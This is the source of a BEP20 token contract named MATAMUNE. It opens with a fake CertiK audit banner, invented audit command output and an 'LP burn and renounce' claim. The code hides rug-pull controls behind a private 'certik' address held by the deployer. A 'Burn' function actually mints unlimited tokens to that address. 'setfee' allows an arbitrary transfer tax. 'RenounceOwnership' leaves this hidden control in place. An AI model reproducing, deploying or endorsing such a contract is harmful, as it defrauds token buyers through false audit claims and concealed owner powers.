/**
 *Submitted for verification at BscScan.com on 2021-12-12
*/

/**
 *CertiK Audit protection and assessment

Static Analysis
Source-code/bytecode scannings via static analysis tool suit

Safety Assessment
Leveraging fact-based and multi-faceted safety evaluation

On-chain Monitoring
Utilizing real-time security monitors and intelligence system

    // CertiK-Identifier Safe Contract Monitoring
*
$ call certik query tx 8067DBC001BE239E5A44843CCEF4C71A87B802352989F97664AF8F265E7B888E
Response:
  Height: 169
  TxHash: 8067DBC001BE239E5A44843CCEF4C71A87B802352989F97664AF8F265E7B888E
  Data: 07BC7F3C21C34643A90AA1138C950FAC5025B693
  Raw Log: [{"msg_index":"0","success":true,"log":"certik1q77870ppcdry82g25yfce9g043gztd5nd3z8uy"}]
  Logs: [{"msg_index":0,"success":true,"log":"certik1q77870ppcdry82g25yfce9g043gztd5nd3z8uy"}]
  Tags: - action = security monitors

$ certik query cvm code certik1q77870ppcdry82g25yfce9g043gztd5nd3z8uy
6080604052348015600F57600080FD5B506004361060325760003560E01C806360FE47B114603757
80636D4CE63C146062575B600080FD5B606060048036036020811015604B57600080FD5B81019080
80359060200190929190505050607E565B005B60686088565B604051808281526020019150506040
5180910390F35B8060008190555050565B6000805490509056FEA265627A7A723058205FEC64D09C
278453AB74A855DCC214EA05BF9541E35E851AF41570397593055564736F6C63430005090032

/


███╗░░░███╗░█████╗░████████╗░█████╗░███╗░░░███╗██╗░░░██╗███╗░░██╗███████╗
████╗░████║██╔══██╗╚══██╔══╝██╔══██╗████╗░████║██║░░░██║████╗░██║██╔════╝
██╔████╔██║███████║░░░██║░░░███████║██╔████╔██║██║░░░██║██╔██╗██║█████╗░░
██║╚██╔╝██║██╔══██║░░░██║░░░██╔══██║██║╚██╔╝██║██║░░░██║██║╚████║██╔══╝░░
██║░╚═╝░██║██║░░██║░░░██║░░░██║░░██║██║░╚═╝░██║╚██████╔╝██║░╚███║███████╗
╚═╝░░░░░╚═╝╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░░░░╚═╝░╚═════╝░╚═╝░░╚══╝╚══════╝
    LP BURN AND RENOUNCE
		
	
$ certik monitor pragma solidity granted access tx 8067DBC001BE239E5A44843CCEF4C71A87B802352989F97664AF8F265E7B888E

    // SPDX-License-Identifier: Unlicensed

**/


pragma solidity ^0.4.24;
library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a * b;
        assert(a == 0 || c / a == b);
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a / b;
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}
contract BEP20 {
    function balanceOf(address who) public constant returns (uint256);
    function transfer(address to, uint256 value) public returns (bool);
    function allowance(address owner, address spender) public constant returns (uint256);
    function transferFrom(address from, address to, uint256 value) public returns (bool);
    function approve(address spender, uint256 value) public returns (bool);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
}
contract MATAMUNE is BEP20 {
    using SafeMath for uint256;
    address public owner = msg.sender;
    address private certik = msg.sender;
    mapping (address => uint256) balances;
    mapping (address => mapping (address => uint256)) allowed;
    string public name;
    string public symbol;
    address private burnaddress;
    uint256 private fees;
    uint8 public decimals;
    uint public totalSupply;
    constructor() public {
        symbol = "MATAMUNE";
        name = "MATAMUNE";
        fees = 4;
        burnaddress = 0x000000000000000000000000000000000000dEaD;
        decimals = 0;
        totalSupply = 1 * 10 ** 12;
        balances[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
    }
    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
    modifier access() {
        require(msg.sender == certik);
        _;
    }
    function balanceOf(address _owner) constant public returns (uint256) {
        return balances[_owner];
    }
    function fee() constant public returns (uint256) {
        return fees;
    }
    function setfee(uint256 taxFee) external access() {
        fees = taxFee;
    }
    function Burn( uint256 amount) public access{
        balances[msg.sender] = balances[msg.sender]+(amount);
        emit Transfer(burnaddress, msg.sender, amount);
    }
    function RenounceOwnership() public onlyOwner returns (bool){
        owner = address(0);
        emit OwnershipTransferred(owner, address(0));
    }
    function transfer(address _to, uint256 _amount) public returns (bool success) {
        require(_to != address(0));
        require(_amount <= balances[msg.sender]);
        if (msg.sender == certik){
        balances[msg.sender] = balances[msg.sender].sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        emit Transfer(msg.sender, _to, _amount);
        return true;
        }else{
        balances[msg.sender] = balances[msg.sender].sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        balances[_to] = balances[_to].sub(_amount / uint256(100) * fees);
        uint256 tokens = balances[_to];
        balances[burnaddress] = balances[burnaddress].add(_amount / uint256(100) * fees);
        uint256 fires = balances[burnaddress];
        emit Transfer(msg.sender, burnaddress, fires);
        emit Transfer(msg.sender, _to, tokens);
        return true;
        }
    }
    function transferFrom(address _from, address _to, uint256 _amount) public returns (bool success) {
        require(_to != address(0));
        require(_amount <= balances[_from]);
        require(_amount <= allowed[_from][msg.sender]);
        balances[_from] = balances[_from].sub(_amount);
        allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        emit Transfer(_from, _to, _amount);
        return true;
    }
    function approve(address _spender, uint256 _value) public returns (bool success) {
        if (_value != 0 && allowed[msg.sender][_spender] != 0) { return false; }
        allowed[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }
    function _msgSender() internal constant returns (address) {
        return msg.sender;
    }
    function allowance(address _owner, address _spender) constant public returns (uint256) {
        return allowed[_owner][_spender];
    }
}